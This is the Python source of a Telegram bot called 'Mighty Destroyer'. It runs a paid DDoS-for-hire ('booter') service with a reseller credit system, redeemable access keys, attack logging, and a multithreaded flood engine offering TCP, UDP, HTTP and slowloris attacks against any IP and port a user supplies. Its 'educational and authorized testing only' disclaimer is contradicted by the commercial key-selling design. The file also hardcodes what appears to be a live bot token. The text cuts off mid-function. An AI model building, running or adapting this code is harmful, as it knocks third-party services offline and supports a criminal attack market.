#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MIGHTY DESTROYER PROJECT - FULL REAL ATTACK BOT
Combines Telegram Bot Management with Real DDoS Attack Engine
For educational and authorized testing only!
"""

import asyncio
import sqlite3
import random
import string
import json
import os
import time
import socket
import ssl
import threading
import struct
import hashlib
import argparse
from datetime import datetime, timedelta
from queue import Queue
from collections import defaultdict
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ---------- DDoS ENGINE IMPORTS ----------
import sys
import re
import select
from urllib.parse import urlparse

# ---------- CONFIG ----------
BOT_TOKEN = "8639883953:AAFgClMxcOBe936nQUQnAzsw_6TIuhCYeZw"
OWNER_ID = 5340461931
BLOCKED_PORTS = [22, 23, 3389, 5900, 8080, 8443]
POWERED_BY = "Powered by Mighty Destroyer"

# Global settings
MAX_ATTACK_TIME = 300
COOLDOWN_SECONDS = 60
MAX_CONCURRENT_ATTACKS = 5
ATTACK_API_URL = ""
ATTACK_API_KEY = ""
PORT_PROTECTION = True
FEEDBACK_ENABLED = True
MAINTENANCE_MODE = False

user_cooldown = {}
active_attacks = {}
attack_threads = {}  # user_id -> thread

# ---------- COLORS ----------
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    DARK = '\033[90m'

# ---------- DATABASE ----------
conn = sqlite3.connect('mighty_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    approved BOOLEAN DEFAULT 0,
    approved_until TIMESTAMP,
    is_reseller BOOLEAN DEFAULT 0,
    attacks_count INTEGER DEFAULT 0,
    join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    total_time_used INTEGER DEFAULT 0,
    credits INTEGER DEFAULT 0,
    banned BOOLEAN DEFAULT 0
)''')

c.execute('''CREATE TABLE IF NOT EXISTS keys (
    key_str TEXT PRIMARY KEY,
    days INTEGER,
    max_duration INTEGER,
    cooldown INTEGER,
    generated_by INTEGER,
    generated_at TIMESTAMP,
    expires_at TIMESTAMP,
    redeemed_by INTEGER,
    redeemed_at TIMESTAMP,
    is_blocked BOOLEAN DEFAULT 0,
    key_type TEXT DEFAULT 'unlimited'
)''')

c.execute('''CREATE TABLE IF NOT EXISTS groups (
    group_id INTEGER PRIMARY KEY,
    group_name TEXT,
    is_authorized BOOLEAN DEFAULT 0,
    max_concurrent INTEGER DEFAULT 5,
    max_time INTEGER DEFAULT 300,
    cooldown INTEGER DEFAULT 60
)''')

c.execute('''CREATE TABLE IF NOT EXISTS attack_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    target_ip TEXT,
    target_port INTEGER,
    duration INTEGER,
    attack_type TEXT,
    attack_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')

c.execute('''CREATE TABLE IF NOT EXISTS key_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_str TEXT,
    action TEXT,
    user_id INTEGER,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')

c.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
    key TEXT PRIMARY KEY,
    value TEXT
)''')

c.execute('''CREATE TABLE IF NOT EXISTS trial_keys (
    key_str TEXT PRIMARY KEY,
    hours INTEGER,
    generated_by INTEGER,
    generated_for INTEGER,
    generated_at TIMESTAMP,
    expires_at TIMESTAMP,
    redeemed_by INTEGER,
    redeemed_at TIMESTAMP,
    used BOOLEAN DEFAULT 0
)''')

# Add missing columns safely
try: c.execute("ALTER TABLE users ADD COLUMN credits INTEGER DEFAULT 0")
except: pass
try: c.execute("ALTER TABLE users ADD COLUMN banned BOOLEAN DEFAULT 0")
except: pass
try: c.execute("ALTER TABLE keys ADD COLUMN max_duration INTEGER DEFAULT 300")
except: pass
try: c.execute("ALTER TABLE keys ADD COLUMN cooldown INTEGER DEFAULT 60")
except: pass
try: c.execute("ALTER TABLE keys ADD COLUMN key_type TEXT DEFAULT 'unlimited'")
except: pass
try: c.execute("ALTER TABLE groups ADD COLUMN max_concurrent INTEGER DEFAULT 5")
except: pass
try: c.execute("ALTER TABLE groups ADD COLUMN max_time INTEGER DEFAULT 300")
except: pass
try: c.execute("ALTER TABLE groups ADD COLUMN cooldown INTEGER DEFAULT 60")
except: pass
try: c.execute("ALTER TABLE attack_logs ADD COLUMN attack_type TEXT DEFAULT 'TURBO'")
except: pass
conn.commit()

def load_settings():
    global MAX_ATTACK_TIME, COOLDOWN_SECONDS, MAX_CONCURRENT_ATTACKS, ATTACK_API_URL, ATTACK_API_KEY, PORT_PROTECTION, FEEDBACK_ENABLED, MAINTENANCE_MODE
    c.execute("SELECT key, value FROM bot_settings")
    for k, v in c.fetchall():
        if k == "max_time": MAX_ATTACK_TIME = int(v)
        elif k == "cooldown": COOLDOWN_SECONDS = int(v)
        elif k == "concurrent": MAX_CONCURRENT_ATTACKS = int(v)
        elif k == "api_url": ATTACK_API_URL = v
        elif k == "api_key": ATTACK_API_KEY = v
        elif k == "port_protection": PORT_PROTECTION = v == "on"
        elif k == "feedback": FEEDBACK_ENABLED = v == "on"
        elif k == "maintenance": MAINTENANCE_MODE = v == "on"

def save_setting(key, value):
    c.execute("INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()

load_settings()

def is_owner(user_id): return user_id == OWNER_ID
def is_reseller(user_id): 
    row = c.execute("SELECT is_reseller FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row and row[0] == 1
def is_banned(user_id):
    row = c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row and row[0] == 1
def is_approved_user(user_id):
    if MAINTENANCE_MODE and not is_owner(user_id): return False
    if is_banned(user_id): return False
    row = c.execute("SELECT approved, approved_until FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row or not row[0]: return False
    if row[1] and datetime.now() > datetime.fromisoformat(row[1]):
        c.execute("UPDATE users SET approved=0, approved_until=NULL WHERE user_id=?", (user_id,))
        conn.commit()
        return False
    return True

def get_group_settings(group_id):
    row = c.execute("SELECT max_concurrent, max_time, cooldown FROM groups WHERE group_id=?", (group_id,)).fetchone()
    if row:
        return {"max_concurrent": row[0], "max_time": row[1], "cooldown": row[2]}
    return {"max_concurrent": MAX_CONCURRENT_ATTACKS, "max_time": MAX_ATTACK_TIME, "cooldown": COOLDOWN_SECONDS}

def log_attack(user_id, ip, port, duration, attack_type):
    c.execute("INSERT INTO attack_logs (user_id, target_ip, target_port, duration, attack_type) VALUES (?,?,?,?,?)", 
              (user_id, ip, port, duration, attack_type))
    c.execute("UPDATE users SET attacks_count = attacks_count + 1, total_time_used = total_time_used + ? WHERE user_id=?", (duration, user_id))
    conn.commit()

def generate_key(days, generated_by, max_duration=None, cooldown=None, key_type='unlimited'):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expires_at = datetime.now() + timedelta(days=days)
    md = max_duration if max_duration is not None else MAX_ATTACK_TIME
    cd = cooldown if cooldown is not None else COOLDOWN_SECONDS
    c.execute("INSERT INTO keys (key_str, days, max_duration, cooldown, generated_by, generated_at, expires_at, key_type) VALUES (?,?,?,?,?,?,?,?)",
              (key, days, md, cd, generated_by, datetime.now().isoformat(), expires_at.isoformat(), key_type))
    c.execute("INSERT INTO key_logs (key_str, action, user_id) VALUES (?,?,?)", (key, "generated", generated_by))
    conn.commit()
    return key, expires_at

def redeem_key(user_id, key_str):
    row = c.execute("SELECT days, max_duration, cooldown, expires_at, redeemed_by, is_blocked, key_type FROM keys WHERE key_str=?", (key_str,)).fetchone()
    if row:
        if row[5] == 1: return False, "Key is blocked"
        if row[4] is not None: return False, "Key already redeemed"
        if datetime.now() > datetime.fromisoformat(row[3]): return False, "Key expired"
        days = row[0]
        approved_until = (datetime.now() + timedelta(days=days)).isoformat()
        c.execute("UPDATE users SET approved=1, approved_until=? WHERE user_id=?", (approved_until, user_id))
        c.execute("UPDATE keys SET redeemed_by=?, redeemed_at=? WHERE key_str=?", (user_id, datetime.now().isoformat(), key_str))
        c.execute("INSERT INTO key_logs (key_str, action, user_id) VALUES (?,?,?)", (key_str, "redeemed", user_id))
        conn.commit()
        return True, f"Approved for {days} days (max_duration={row[1]}s, cooldown={row[2]}s)"
    trial = c.execute("SELECT hours, expires_at, redeemed_by, used FROM trial_keys WHERE key_str=?", (key_str,)).fetchone()
    if trial:
        if trial[3] == 1: return False, "Trial key already used"
        if datetime.now() > datetime.fromisoformat(trial[1]): return False, "Trial key expired"
        hours = trial[0]
        approved_until = (datetime.now() + timedelta(hours=hours)).isoformat()
        c.execute("UPDATE users SET approved=1, approved_until=? WHERE user_id=?", (approved_until, user_id))
        c.execute("UPDATE trial_keys SET redeemed_by=?, redeemed_at=?, used=1 WHERE key_str=?", (user_id, datetime.now().isoformat(), key_str))
        c.execute("INSERT INTO key_logs (key_str, action, user_id) VALUES (?,?,?)", (key_str, "redeemed_trial", user_id))
        conn.commit()
        return True, f"Approved for {hours} hours (trial)"
    return False, "Key not found"

def add_credits(user_id, amount):
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
def remove_credits(user_id, amount):
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
    conn.commit()

# ---------- DDoS ATTACK ENGINE ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

REFERRERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
]

def generate_random_payload(size=1024):
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{};:,.<>?/~`"
    return ''.join(random.choice(charset) for _ in range(size)).encode()

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def generate_advanced_headers(host, path="/"):
    accept = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"]
    accept_encoding = ["gzip, deflate, br"]
    accept_language = ["en-US,en;q=0.9"]
    cache_control = ["max-age=0", "no-cache"]
    headers = {
        "Host": host,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(accept),
        "Accept-Encoding": random.choice(accept_encoding),
        "Accept-Language": random.choice(accept_language),
        "Cache-Control": random.choice(cache_control),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    if random.random() > 0.6:
        headers["Referer"] = random.choice(REFERRERS)
    if random.random() > 0.9:
        headers["X-Forwarded-For"] = random_ip()
    return headers

def create_advanced_http_request(target, method="GET", path="/", headers=None):
    if headers is None:
        headers = generate_advanced_headers(target, path)
    if method == "RANDOM":
        method = random.choice(["GET", "POST", "HEAD"])
    if "?" in path:
        path += f"&_={random.randint(100000, 999999)}"
    else:
        if random.random() > 0.5:
            path += f"?_={random.randint(100000, 999999)}"
    request = f"{method} {path} HTTP/1.1\r\n"
    for k, v in headers.items():
        request += f"{k}: {v}\r\n"
    request += "\r\n"
    return request.encode()

class RealDDoSAttack:
    def __init__(self, target, port, attack_type="TURBO", threads=1000, duration=60, use_ssl=False, 
                 path="/", intensity=10, packet_size=1400, http_method="RANDOM", keep_alive=True):
        self.target = target
        self.port = port
        self.attack_type = attack_type.upper()
        self.threads = min(threads, 5000)
        self.duration = duration
        self.is_running = True
        self.counter = 0
        self.start_time = None
        self.q = Queue()
        self.use_ssl = use_ssl
        self.path = path
        self.intensity = min(max(intensity, 1), 10)
        self.packet_size = min(packet_size, 65535)
        self.http_method = http_method.upper()
        self.keep_alive = keep_alive
        self.lock = threading.Lock()
        self.random_payload = generate_random_payload(self.packet_size)
        self.form_data = {
            "username": f"user_{hashlib.md5(os.urandom(16)).hexdigest()}",
            "password": f"pass_{random.randint(10000,99999)}",
            "comment": generate_random_payload(200).decode(errors='ignore'),
        }
    
    def _tcp_flood(self):
        while self.is_running:
            try:
                for _ in range(self.intensity):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((self.target, self.port))
                    if self.keep_alive:
                        s.send(self.random_payload[:100])
                    s.close()
                    with self.lock:
                        self.counter += 1
            except:
                pass
    
    def _udp_flood(self):
        while self.is_running:
            try:
                for _ in range(self.intensity * 2):
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(self.random_payload, (self.target, self.port))
                    s.close()
                    with self.lock:
                        self.counter += 1
            except:
                pass
    
    def _http_flood_advanced(self):
        while self.is_running:
            try:
                for _ in range(self.intensity * 3):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target, self.port))
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    method = self.http_method if self.http_method != "RANDOM" else random.choice(["GET", "POST", "HEAD"])
                    path_with_params = self.path
                    if random.random() > 0.4:
                        params = [f"p{random.randint(1,999)}={random.randint(1,999999)}" for _ in range(random.randint(1,3))]
                        path_with_params += "?" + "&".join(params)
                    request = create_advanced_http_request(self.target, method, path_with_params)
                    s.send(request)
                    if self.keep_alive and random.random() > 0.3:
                        try:
                            s.recv(1024)
                        except:
                            pass
                    s.close()
                    with self.lock:
                        self.counter += 1
            except:
                pass
    
    def _slowloris_super(self):
        max_sockets = min(self.threads, 2000)
        socket_list = []
        for _ in range(max_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=self.target)
                initial = f"GET {self.path} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
                s.send(initial.encode())
                socket_list.append(s)
                with self.lock:
                    self.counter += 1
            except:
                pass
        while self.is_running:
            for s in list(socket_list):
                try:
                    header = f"X-{random.randint(1,10000)}: {random.randint(1,999999)}\r\n"
                    s.send(header.encode())
                    with self.lock:
                        self.counter += 1
                except:
                    socket_list.remove(s)
                    try:
                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ns.settimeout(4)
                        ns.connect((self.target, self.port))
                        if self.use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            ns = context.wrap_socket(ns, server_hostname=self.target)
                        ns.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                        socket_list.append(ns)
                    except:
                        pass
            time.sleep(2)
    
    def _turbo_flood(self):
        attack_methods = [self._tcp_flood, self._udp_flood, self._http_flood_advanced]
        while self.is_running:
            method = random.choice(attack_methods)
            method()
            time.sleep(0.01)
    
    def _worker(self):
        attack_func = self.q.get()
        if attack_func == "TCP":
            self._tcp_flood()
        elif attack_func == "UDP":
            self._udp_flood()
        elif attack_func == "HTTP":
            self._http_flood_advanced()
        elif attack_func == "SLOWLORIS":
            self._slowloris_super()
        elif attack_func == "TURBO":
            self._turbo_flood()
        self.q.task_done()
    
    def start(self):
        self.start_time = time.time()
        for _ in range(self.threads):
            self.q.put(self.attack_type)
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
        end_time = time.time() + self.duration
        while time.time() < end_time and self.is_running:
            time.sleep(1)
        self.is_running = False
    
    def stop(self):
        self.is_running = False

def run_real_attack(target_ip, port, attack_type, duration, threads, use_ssl, path, intensity):
    attack = RealDDoSAttack(
        target=target_ip,
        port=port,
        attack_type=attack_type.upper(),
        threads=threads,
        duration=duration,
        use_ssl=use_ssl,
        path=path,
        intensity=intensity,
        packet_size=1400,
        http_method="RANDOM",
        keep_alive=True
    )
    attack.start()
    return attack.counter

# ---------- TELEGRAM BOT COMMANDS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    await update.message.reply_text(f"🤖 MIGHTY DESTROYER BOT\nUse /help for commands.\n{POWERED_BY}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"""💀 *MIGHTY DESTROYER - REAL ATTACK BOT* 💀

👤 *User Commands*
/start, /help, /menu, /redeem <code>
/attack <ip> <port> <duration> [type]

👥 *Group Management (Owner)*
/approvegroup <id> <max_concurrent> <max_time> <cooldown>
/approve (in group) - Approve current group
/disapprove - Remove current group
/approved_groups - List approved groups

🚫 *User Management*
/ban <user_id> - Ban user
/unban <user_id> - Unban user
/banned_list - List banned users

💼 *Reseller System*
/add_reseller <user_id> - Add reseller
/remove_reseller <user_id> - Remove reseller
/resellers - List resellers
/addcredit <user_id> <amount> - Add credits
/removecredit <user_id> <amount> - Remove credits
/reseller_credits - Show all reseller credits
/gen <prefix> <days> <count> - Generate keys (cost 1 credit each)

🔑 *Key Generation (Owner)*
/genkey <max_duration> <cooldown> <days> - Master key
/gential <hours> <count> - Generate trial keys

📊 *Statistics & Logs*
/state - Detailed stats
/view_logs [N] - Attack logs
/server_stats - Server resources
/private_users - Active users

⚙️ *Settings*
/settime <seconds>
/setcooldown <seconds>
/setconcurrent <number>
/port_protection on/off
/maintenance on/off

📢 *Broadcast*
/broadcast_private_users <msg>
/broadcast_all_users <msg>

🛡️ {POWERED_BY}"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await help_command(update, context)

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if len(args) < 2 or not args[1].isdigit():
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    target = int(args[0])
    days = int(args[1])
    until = (datetime.now() + timedelta(days=days)).isoformat()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved, approved_until) VALUES (?,1,?)", (target, until))
    conn.commit()
    await update.message.reply_text(f"✅ User {target} approved for {days} days.")

async def approve_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if update.effective_chat.type != "private":
        group_id = update.effective_chat.id
        group_name = update.effective_chat.title
        if len(args) >= 3:
            max_concurrent = int(args[0])
            max_time = int(args[1])
            cooldown = int(args[2])
        else:
            max_concurrent = MAX_CONCURRENT_ATTACKS
            max_time = MAX_ATTACK_TIME
            cooldown = COOLDOWN_SECONDS
        c.execute("INSERT OR REPLACE INTO groups (group_id, group_name, is_authorized, max_concurrent, max_time, cooldown) VALUES (?,?,1,?,?,?)",
                  (group_id, group_name, max_concurrent, max_time, cooldown))
        conn.commit()
        await update.message.reply_text(f"✅ Group {group_name} approved with limits: concurrent={max_concurrent}, max_time={max_time}s, cooldown={cooldown}s")
    else:
        if len(args) < 4:
            await update.message.reply_text("Usage: /approvegroup <group_id> <max_concurrent> <max_time> <cooldown>")
            return
        group_id = int(args[0])
        max_concurrent = int(args[1])
        max_time = int(args[2])
        cooldown = int(args[3])
        c.execute("INSERT OR REPLACE INTO groups (group_id, group_name, is_authorized, max_concurrent, max_time, cooldown) VALUES (?,?,1,?,?,?)",
                  (group_id, "Unknown", max_concurrent, max_time, cooldown))
        conn.commit()
        await update.message.reply_text(f"✅ Group {group_id} approved.")

async def disapprove_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    if update.effective_chat.type != "private":
        group_id = update.effective_chat.id
        c.execute("DELETE FROM groups WHERE group_id=?", (group_id,))
        conn.commit()
        await update.message.reply_text("❌ Group disapproved")
    else:
        await update.message.reply_text("Use this command inside the group.")

async def approved_groups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    rows = c.execute("SELECT group_id, group_name, max_concurrent, max_time, cooldown FROM groups WHERE is_authorized=1").fetchall()
    if not rows:
        await update.message.reply_text("No approved groups.")
        return
    msg = "📋 Approved Groups:\n"
    for r in rows:
        msg += f"ID: {r[0]} | Name: {r[1]}\n   Limits: concurrent={r[2]}, time={r[3]}s, cooldown={r[4]}s\n"
    await update.message.reply_text(msg)

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    target = int(args[0])
    c.execute("UPDATE users SET banned=1 WHERE user_id=?", (target,))
    conn.commit()
    await update.message.reply_text(f"✅ User {target} banned.")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    target = int(args[0])
    c.execute("UPDATE users SET banned=0 WHERE user_id=?", (target,))
    conn.commit()
    await update.message.reply_text(f"✅ User {target} unbanned.")

async def banned_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    rows = c.execute("SELECT user_id FROM users WHERE banned=1").fetchall()
    if not rows:
        await update.message.reply_text("No banned users.")
        return
    msg = "🚫 Banned users:\n" + "\n".join(str(r[0]) for r in rows)
    await update.message.reply_text(msg)

async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /add_reseller <user_id>")
        return
    target = int(args[0])
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (target,))
    c.execute("UPDATE users SET is_reseller=1 WHERE user_id=?", (target,))
    conn.commit()
    await update.message.reply_text(f"✅ User {target} is now a reseller.")

async def remove_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /remove_reseller <user_id>")
        return
    target = int(args[0])
    c.execute("DELETE FROM keys WHERE generated_by=?", (target,))
    c.execute("UPDATE users SET is_reseller=0 WHERE user_id=?", (target,))
    conn.commit()
    await update.message.reply_text(f"❌ Reseller {target} removed and their keys deleted.")

async def resellers_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    rows = c.execute("SELECT user_id FROM users WHERE is_reseller=1").fetchall()
    if not rows:
        await update.message.reply_text("No resellers.")
        return
    msg = "📋 Resellers:\n" + "\n".join(str(r[0]) for r in rows)
    await update.message.reply_text(msg)

async def addcredit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if len(args) < 2 or not args[1].isdigit():
        await update.message.reply_text("Usage: /addcredit <user_id> <amount>")
        return
    target = int(args[0])
    amount = int(args[1])
    add_credits(target, amount)
    await update.message.reply_text(f"✅ Added {amount} credits to user {target}.")

async def removecredit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if len(args) < 2 or not args[1].isdigit():
        await update.message.reply_text("Usage: /removecredit <user_id> <amount>")
        return
    target = int(args[0])
    amount = int(args[1])
    remove_credits(target, amount)
    await update.message.reply_text(f"✅ Removed {amount} credits from user {target}.")

async def reseller_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    rows = c.execute("SELECT user_id, credits FROM users WHERE is_reseller=1").fetchall()
    if not rows:
        await update.message.reply_text("No resellers.")
        return
    msg = "💰 Reseller Credits:\n" + "\n".join(f"User {r[0]}: {r[1]} credits" for r in rows)
    await update.message.reply_text(msg)

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_reseller(user_id):
        await update.message.reply_text("❌ Reseller only")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: /gen <prefix> <days> <count>")
        return
    prefix = args[0]
    days = int(args[1])
    count = int(args[2])
    row = c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not row or row[0] < count:
        await update.message.reply_text(f"Insufficient credits. Need {count} credits, you have {row[0] if row else 0}.")
        return
    keys = []
    for _ in range(count):
        key = prefix + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16-len(prefix)))
        expires = datetime.now() + timedelta(days=days)
        c.execute("INSERT INTO keys (key_str, days, generated_by, generated_at, expires_at, key_type) VALUES (?,?,?,?,?,?)",
                  (key, days, user_id, datetime.now().isoformat(), expires.isoformat(), 'reseller'))
        keys.append(key)
    remove_credits(user_id, count)
    conn.commit()
    await update.message.reply_text(f"🔑 Generated {count} keys (cost {count} credits):\n" + "\n".join(f"`{k}`" for k in keys), parse_mode='Markdown')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: /genkey <max_duration> <cooldown> <days>")
        return
    max_dur = int(args[0])
    cd = int(args[1])
    days = int(args[2])
    key, exp = generate_key(days, update.effective_user.id, max_dur, cd, 'unlimited')
    await update.message.reply_text(f"🔑 Master Key Generated:\n`{key}`\nDays: {days}\nMax duration: {max_dur}s\nCooldown: {cd}s\nExpires: {exp}", parse_mode='Markdown')

async def gential(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /gential <hours> <count>")
        return
    hours = int(args[0])
    count = int(args[1])
    keys = []
    for _ in range(count):
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        expires = datetime.now() + timedelta(hours=hours)
        c.execute("INSERT INTO trial_keys (key_str, hours, generated_by, generated_at, expires_at) VALUES (?,?,?,?,?)",
                  (key, hours, update.effective_user.id, datetime.now().isoformat(), expires.isoformat()))
        keys.append(key)
    conn.commit()
    await update.message.reply_text(f"🎟️ Generated {count} trial keys ({hours} hours each):\n" + "\n".join(f"`{k}`" for k in keys), parse_mode='Markdown')

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    success, msg = redeem_key(update.effective_user.id, args[0])
    await update.message.reply_text(f"{'✅ Success' if success else '❌ Failed'}: {msg}")

async def state(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    approved = c.execute("SELECT COUNT(*) FROM users WHERE approved=1").fetchone()[0]
    attacks = c.execute("SELECT SUM(attacks_count) FROM users").fetchone()[0] or 0
    resellers = c.execute("SELECT COUNT(*) FROM users WHERE is_reseller=1").fetchone()[0]
    msg = f"""📊 *Mighty Bot State*
👥 Total Users: {total}
✅ Approved: {approved}
⚔️ Total Attacks: {attacks}
💼 Resellers: {resellers}
⏱️ Max Time: {MAX_ATTACK_TIME}s
🔄 Cooldown: {COOLDOWN_SECONDS}s
📡 Concurrent: {MAX_CONCURRENT_ATTACKS}
🛡️ Port Protection: {'ON' if PORT_PROTECTION else 'OFF'}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
{POWERED_BY}"""
    await update.message.reply_text(msg, parse_mode='Markdown')

async def view_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    n = int(context.args[0]) if context.args and context.args[0].isdigit() else 10
    rows = c.execute("SELECT id, user_id, target_ip, target_port, duration, attack_type, attack_time FROM attack_logs ORDER BY id DESC LIMIT ?", (n,)).fetchall()
    if not rows:
        await update.message.reply_text("No logs.")
        return
    msg = "📜 Recent Attacks:\n" + "\n".join(f"#{r[0]} | User {r[1]} | {r[2]}:{r[3]} | {r[4]}s | {r[5]} | {r[6][:19]}" for r in rows)
    await update.message.reply_text(msg)

async def server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only")
        return
    try:
        import psutil
        cpu = psutil.cpu_percent()
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime = time.time() - psutil.boot_time()
        uptime_str = str(timedelta(seconds=int(uptime)))
        msg = f"""🖥️ Server Stats
CPU: {cpu}%
